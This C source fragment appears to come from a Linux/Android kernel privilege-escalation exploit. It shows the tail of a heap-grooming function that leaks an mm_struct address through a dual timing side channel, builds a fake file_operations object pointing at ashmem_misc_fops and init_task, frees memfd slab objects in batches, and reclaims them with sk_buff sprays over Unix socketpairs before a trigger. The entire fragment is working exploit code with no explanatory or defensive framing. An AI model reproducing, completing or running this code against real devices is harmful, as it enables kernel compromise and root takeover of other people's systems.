          g_ks_verify->collision_baseline, g_ks_verify->collision_threshold,
          g_ks_verify->collision_min_time, g_ks_verify->confirmed_collisions,
          verify_collisions);
  if (!primary_collisions || !verify_collisions) {
    fprintf(stderr, "[groom] kernelsnitch dual collision finding failed\n");
    goto cleanup;
  }

  kernelsnitch_bruteforce(g_ks);
  kernelsnitch_bruteforce(g_ks_verify);
  uint64_t leaked = g_ks->mm_struct;
  uint64_t verified_leak = g_ks_verify->mm_struct;
  if (leaked == (uint64_t)-1 || verified_leak == (uint64_t)-1 ||
      leaked != verified_leak) {
    fprintf(stderr,
            "[groom] kernelsnitch dual leak rejected primary=%016llx "
            "verify=%016llx\n",
            (unsigned long long)leaked, (unsigned long long)verified_leak);
    goto cleanup;
  }
  groom_dbg("bruteforce-done", dbg_t0, &dbg_last); /* dual timing leak */

  uint64_t aligned_base = 0;
  size_t object_index = 0;
  if (!validate_mm_candidate(leaked, &aligned_base, &object_index)) {
    fprintf(stderr, "[groom] mm candidate geometry rejected leaked=%016llx\n",
            (unsigned long long)leaked);
    goto cleanup;
  }
  fprintf(stderr,
          "[groom] mm leaked=%016llx aligned_base=%016llx object_index=%zu "
          "dual_match=1\n",
          (unsigned long long)leaked, (unsigned long long)aligned_base,
          object_index);

  build_fops_install_object(skb_buf, aligned_base, kernel_base,
                             ashmem_misc_fops_addr, init_task_addr);
  uint64_t object_hash = fops_object_fingerprint(skb_buf);
  if (!validate_fops_object(skb_buf, aligned_base)) {
    fprintf(stderr,
            "[groom] local fake fops validation failed hash=%016llx\n",
            (unsigned long long)object_hash);
    goto cleanup;
  }
  fprintf(stderr,
          "[groom] local fake fops owner=0 layout=pass hash=%016llx\n",
          (unsigned long long)object_hash);

  if (socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv) != 0) {
    fprintf(stderr, "[groom] reclaim socketpair failed errno=%d\n", errno);
    goto cleanup;
  }
  int sndbuf = 1 << 20;
  if (setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf,
                 sizeof(sndbuf)) != 0) {
    fprintf(stderr, "[groom] SO_SNDBUF failed errno=%d\n", errno);
    goto cleanup;
  }
  int effective_sndbuf = 0;
  socklen_t effective_sndbuf_len = sizeof(effective_sndbuf);
  if (getsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &effective_sndbuf,
                 &effective_sndbuf_len) != 0 || effective_sndbuf < sndbuf) {
    fprintf(stderr,
            "[groom] SO_SNDBUF effective rejected request=%d effective=%d "
            "errno=%d\n",
            sndbuf, effective_sndbuf, errno);
    goto cleanup;
  }
  fprintf(stderr, "[groom] SO_SNDBUF request=%d effective=%d\n", sndbuf,
          effective_sndbuf);
  int flags = fcntl(reclaim_sv[0], F_GETFL, 0);
  if (flags < 0 || fcntl(reclaim_sv[0], F_SETFL, flags | O_NONBLOCK) != 0) {
    fprintf(stderr, "[groom] reclaim nonblock failed errno=%d\n", errno);
    goto cleanup;
  }
  if (socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_sv) != 0) {
    fprintf(stderr, "[groom] pcp socketpair failed errno=%d\n", errno);
    goto cleanup;
  }

  struct iovec iov = {.iov_base = skb_buf, .iov_len = OSS_SKB_SEND_SIZE};
  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  ssize_t pcp_sent;
  do {
    pcp_sent = sendmsg(pcp_sv[0], &msg, 0);
  } while (pcp_sent < 0 && errno == EINTR);
  if (pcp_sent != (ssize_t)OSS_SKB_SEND_SIZE) {
    fprintf(stderr,
            "[groom] pcp sendmsg incomplete sent=%zd want=%d errno=%d\n",
            pcp_sent, OSS_SKB_SEND_SIZE, pcp_sent < 0 ? errno : 0);
    goto cleanup;
  }

  if (pin_and_validate_groom_cpu() != 0) {
    fprintf(stderr, "[groom] CPU-%d reclaim pin failed errno=%d\n",
            g_groom_cpu, errno);
    goto cleanup;
  }

  size_t prepare_slab_count = prepare_ctx.mm_cnt / mm_objs_per_slab;
  close(pcp_sv[0]);
  close(pcp_sv[1]);
  pcp_sv[0] = -1;
  pcp_sv[1] = -1;

  size_t spray_seed_drains = spray_ctx.mm_cnt / mm_objs_per_slab;

  int *cage_sources[OSS_CRITICAL_FD_MAX];
  size_t cage_count = 0;
  size_t target_pre = pre_ctx.mm_cnt - 1;
  cage_sources[cage_count++] = &pre_ctx.memfds[target_pre];
  cage_sources[cage_count++] = &post_ctx.memfds[0];
  for (size_t i = 0; i < target_pre; i++) {
    cage_sources[cage_count++] = &pre_ctx.memfds[i];
  }
  for (size_t i = 1; i < post_ctx.mm_cnt - 1; i++) {
    cage_sources[cage_count++] = &post_ctx.memfds[i];
  }
  if (cage_count > OSS_CRITICAL_FD_MAX) {
    fprintf(stderr, "[groom] target cage overflow count=%zu\n", cage_count);
    goto cleanup;
  }

  int cage_first_fd = -1, cage_last_fd = -1;
  if (!prepare_close_range_batch(cage_sources, cage_count, &cage_first_fd,
                                 &cage_last_fd)) {
    fprintf(stderr,
            "[groom] target cage close_range preparation failed count=%zu "
            "errno=%d\n",
            cage_count, errno);
    goto cleanup;
  }
  if (pin_and_validate_groom_cpu() != 0 || sched_getcpu() != g_groom_cpu) {
    fprintf(stderr,
            "[groom] target cage CPU drift expected=%d actual=%d errno=%d\n",
            g_groom_cpu, sched_getcpu(), errno);
    for (int close_fd = cage_first_fd; close_fd <= cage_last_fd; close_fd++) {
      close(close_fd);
    }
    goto cleanup;
  }
  if (!close_range_batch(cage_first_fd, cage_last_fd)) {
    int close_error = errno;
    for (int close_fd = cage_first_fd; close_fd <= cage_last_fd; close_fd++) {
      close(close_fd);
    }
    fprintf(stderr,
            "[groom] target cage close_range failed first=%d last=%d errno=%d\n",
            cage_first_fd, cage_last_fd, close_error);
    goto cleanup;
  }

  if (pin_and_validate_groom_cpu() != 0 || sched_getcpu() != g_groom_cpu) {
    fprintf(stderr,
            "[groom] partial seed CPU drift expected=%d actual=%d errno=%d\n",
            g_groom_cpu, sched_getcpu(), errno);
    goto cleanup;
  }
  int *seed_sources[OSS_CRITICAL_FD_MAX];
  size_t seed_count = 0;
  for (size_t i = 0; i < prepare_slab_count; i++) {
    seed_sources[seed_count++] = &prepare_ctx.memfds[i * mm_objs_per_slab];
  }
  for (size_t i = 0; i < spray_seed_drains; i++) {
    seed_sources[seed_count++] = &spray_ctx.memfds[i * mm_objs_per_slab];
  }
  if (seed_count > OSS_CRITICAL_FD_MAX) {
    fprintf(stderr, "[groom] partial seed overflow count=%zu\n", seed_count);
    goto cleanup;
  }

  int seed_first_fd = -1, seed_last_fd = -1;
  if (!prepare_close_range_batch(seed_sources, seed_count, &seed_first_fd,
                                 &seed_last_fd)) {
    fprintf(stderr,
            "[groom] partial seed close_range preparation failed count=%zu "
            "errno=%d\n",
            seed_count, errno);
    goto cleanup;
  }
  if (!close_range_batch(seed_first_fd, seed_last_fd)) {
    int close_error = errno;
    for (int close_fd = seed_first_fd; close_fd <= seed_last_fd; close_fd++) {
      close(close_fd);
    }
    fprintf(stderr,
            "[groom] partial seed close_range failed first=%d last=%d "
            "errno=%d\n",
            seed_first_fd, seed_last_fd, close_error);
    goto cleanup;
  }
  fprintf(stderr, "[groom] mm partial seed prepare=%zu spray=%zu cpu=%d\n",
          prepare_slab_count, spray_seed_drains, sched_getcpu());

  int *critical_sources[] = {&memfd_leak};
  size_t critical_count = sizeof(critical_sources) / sizeof(critical_sources[0]);
  int critical_first_fd = -1, critical_last_fd = -1;
  if (!prepare_close_range_batch(critical_sources, critical_count,
                                 &critical_first_fd, &critical_last_fd)) {
    fprintf(stderr,
            "[groom] final target close_range preparation failed errno=%d\n",
            errno);
    goto cleanup;
  }

  struct reclaim_slab_snapshot reclaim_before;
  if (!read_reclaim_slabs(&reclaim_before)) {
    fprintf(stderr, "[groom] pre-reclaim slab snapshot failed\n");
    for (int close_fd = critical_first_fd; close_fd <= critical_last_fd;
         close_fd++) {
      close(close_fd);
    }
    goto cleanup;
  }
  if (pin_and_validate_groom_cpu() != 0 || sched_getcpu() != g_groom_cpu) {
    fprintf(stderr,
            "[groom] critical CPU drift expected=%d actual=%d errno=%d\n",
            g_groom_cpu, sched_getcpu(), errno);
    for (int close_fd = critical_first_fd; close_fd <= critical_last_fd;
         close_fd++) {
      close(close_fd);
    }
    goto cleanup;
  }

  size_t drain_triggers = seed_count;
  int reclaim_sent = 0;
  int reclaim_incomplete = 0;
  ssize_t sent;
  if (!close_range_batch(critical_first_fd, critical_last_fd)) {
    int close_error = errno;
    for (int close_fd = critical_first_fd; close_fd <= critical_last_fd;
         close_fd++) {
      close(close_fd);
    }
    fprintf(stderr,
            "[groom] critical close_range failed first=%d last=%d errno=%d\n",
            critical_first_fd, critical_last_fd, close_error);
    goto cleanup;
  }
  for (int i = 0; i < OSS_SKB_RECLAIM_SENDS; i++) {
    do {
      sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
    } while (sent < 0 && errno == EINTR);
    if (sent == (ssize_t)OSS_SKB_SEND_SIZE) {
      reclaim_sent++;
      continue;
    }
    if (sent < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
      break;
    }
    reclaim_incomplete = 1;
    break;
  }
  fprintf(stderr,
          "[groom] target cage refs=%zu seed=%zu final_release=%zu cpu=%d\n",
          cage_count, seed_count, critical_count, sched_getcpu());
  fprintf(stderr,
          "[groom] mm drain triggers=%zu sk_buff reclaim sends=%d/%d\n",
          drain_triggers, reclaim_sent, OSS_SKB_RECLAIM_SENDS);

  long reclaim_min = groom_env_long_clamped(
      "RMG_RECLAIM_MIN_FULL", OSS_SKB_RECLAIM_MIN_FULL,
      OSS_SKB_RECLAIM_MIN_FULL, OSS_SKB_RECLAIM_SENDS);
  if (reclaim_sent < reclaim_min || reclaim_incomplete) {
    fprintf(stderr,
            "[groom] reclaim batch rejected full=%d minimum=%ld "
            "incomplete=%d\n",
            reclaim_sent, reclaim_min, reclaim_incomplete);
    goto cleanup;
  }

  struct reclaim_slab_snapshot reclaim_after;
  if (!read_reclaim_slabs(&reclaim_after) ||
      !exact_mm_reclaim(&reclaim_before.mm, &reclaim_after.mm,
                        (unsigned long)critical_count)) {
    fprintf(stderr,
            "[groom] exact reclaim proof rejected released_refs=%zu\n",
            critical_count);
    goto cleanup;
  }

  int quiet_samples = 0;
  if (!wait_for_reclaim_quiet_window(&quiet_samples, NULL)) {
    fprintf(stderr,
            "[groom] reclaim quiet window rejected samples=%d required=%d\n",
            quiet_samples, OSS_RECLAIM_QUIET_STREAK);
    goto cleanup;
  }
  char checkpoint[160];
  snprintf(checkpoint, sizeof(checkpoint),
           "groom-pretrigger leak=%016llx idx=%zu sends=%d quiet=%d hash=%016llx",
           (unsigned long long)leaked, object_index, reclaim_sent,
           quiet_samples, (unsigned long long)object_hash);
  oss_diag_checkpoint(checkpoint);

  groom_dbg("drain-reclaim-done", dbg_t0, &dbg_last); /* build+socketpair+drain+reclaim */

  /* Keep reclaim_sv open: queued skbs must remain alive through trigger. */
  result = aligned_base;
  reclaim_sv[0] = -1;
  reclaim_sv[1] = -1;

cleanup:
  if (g_ks) {
    kernelsnitch_cleanup(g_ks);
    g_ks = NULL;
  }
  if (g_ks_verify) {
    kernelsnitch_cleanup(g_ks_verify);
    g_ks_verify = NULL;
  }
  if (child_leak > 0) {
    kill_child(child_leak);
  }
  if (memfd_leak >= 0) {
    close(memfd_leak);
  }
  for (size_t i = 0; i < 2; i++) {
    if (pcp_sv[i] >= 0) {
      close(pcp_sv[i]);
    }
    if (reclaim_sv[i] >= 0) {
      close(reclaim_sv[i]);
    }
  }
  if (result) {

    release_ctx_storage(&post_ctx);
    release_ctx_storage(&pre_ctx);
    release_ctx_storage(&spray_ctx);
    release_ctx_storage(&prepare_ctx);
  } else {
    cleanup_ctx(&post_ctx);
    cleanup_ctx(&pre_ctx);
    cleanup_ctx(&spray_ctx);
    cleanup_ctx(&prepare_ctx);
  }
  free(skb_buf);
  return result;
}

uint64_t groom_and_install_fops_object(uint64_t kernel_base,
                                        uint64_t ashmem_misc_fops_addr,
                                        uint64_t init_task_addr) {
  return groom_and_install_fops_object_impl(kernel_base, ashmem_misc_fops_addr,
                                             init_task_addr);
}
